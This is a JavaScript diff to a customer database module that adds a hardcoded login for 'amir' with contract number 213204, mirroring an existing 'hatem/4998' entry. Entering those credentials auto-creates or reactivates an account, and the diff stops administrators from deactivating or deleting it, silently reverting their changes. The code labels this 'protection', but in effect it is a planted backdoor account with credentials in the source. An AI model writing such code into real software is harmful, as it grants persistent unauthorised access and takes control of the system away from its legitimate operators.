@@ -557,6 +557,11 @@ export const db = {
             console.warn("Cannot deactivate protected customer (hatem/4998). Reverting to active.");
             customer.isActive = true;
         }
+        // PROTECTION: Prevent modifying 'amir' (213204) to be inactive
+        if (customer.contractNumber === '213204' && !customer.isActive) {
+            console.warn("Cannot deactivate protected customer (amir/213204). Reverting to active.");
+            customer.isActive = true;
+        }
 
         if (dbInstance) {
             try {
@@ -581,6 +586,11 @@ export const db = {
             alert("لا يمكن حذف هذا العميل (محمي).");
             return;
         }
+        if (target && target.contractNumber === '213204') {
+            console.warn("Attempt to delete protected customer (amir/213204) blocked.");
+            alert("لا يمكن حذف هذا العميل (محمي).");
+            return;
+        }
 
         if (dbInstance) {
             try { await deleteDoc(doc(dbInstance, "customers", id)); } catch (e) { console.error(e); }
@@ -601,6 +611,31 @@ export const db = {
                     id: 'protected_hatem_4998',
                     name: 'hatem',
                     contractNumber: '4998',
+                    isActive: true,
+                    createdAt: Date.now(),
+                    lastLogin: Date.now()
+                };
+                await db.saveCustomer(protectedCustomer);
+            } else if (!protectedCustomer.isActive) {
+                // Force reactivate if somehow deactivated
+                protectedCustomer.isActive = true;
+                await db.saveCustomer(protectedCustomer);
+            }
+
+            return protectedCustomer;
+        }
+
+        // PROTECTION: Hardcoded access for 'amir' / '213204'
+        if (name.trim().toLowerCase() === 'amir' && contractNumber.trim() === '213204') {
+            const customers = await db.getCustomers();
+            let protectedCustomer = customers.find(c => c.contractNumber === '213204');
+
+            if (!protectedCustomer) {
+                // Auto-create if not exists
+                protectedCustomer = {
+                    id: 'protected_amir_213204',
+                    name: 'amir',
+                    contractNumber: '213204',
                     isActive: true,
                     createdAt: Date.now(),
                     lastLogin: Date.now()
